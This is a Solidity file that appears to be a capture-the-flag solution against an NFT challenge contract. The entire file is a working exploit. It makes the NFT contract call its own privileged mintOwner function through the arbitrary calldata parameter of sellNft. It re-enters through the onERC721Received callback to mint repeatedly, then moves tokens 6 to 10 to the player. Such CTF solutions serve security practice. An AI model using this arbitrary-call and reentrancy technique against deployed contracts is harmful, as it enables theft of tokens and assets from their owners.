// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "src/UECallNft.sol";
import "solmate/tokens/ERC721.sol";

contract Solve is CTFSolver {
    function solve(address _challenge, address player) internal override {
        Challenge challenge = Challenge(_challenge);
        UECallNft nftContract = challenge.nftContract();

        NftExploit exploit = new NftExploit(nftContract, player);
        exploit.attack();
    }
}

contract NftExploit is ERC721TokenReceiver {
    UECallNft public nftContract;
    address public player;
    uint256 public callCount;

    constructor(UECallNft _nftContract, address _player) {
        nftContract = _nftContract;
        player = _player;
    }

    function attack() external {
        bytes memory mintCalldata = abi.encodeWithSignature("mintOwner(address)", address(this));
        nftContract.sellNft(1, address(nftContract), mintCalldata);

        for (uint256 i = 6; i <= 10; i++) {
            nftContract.transferFrom(address(this), player, i);
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        callCount++;
        if (callCount < 5) {
            bytes memory mintCalldata = abi.encodeWithSignature("mintOwner(address)", address(this));
            nftContract.sellNft(callCount + 1, address(nftContract), mintCalldata);
        }
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}
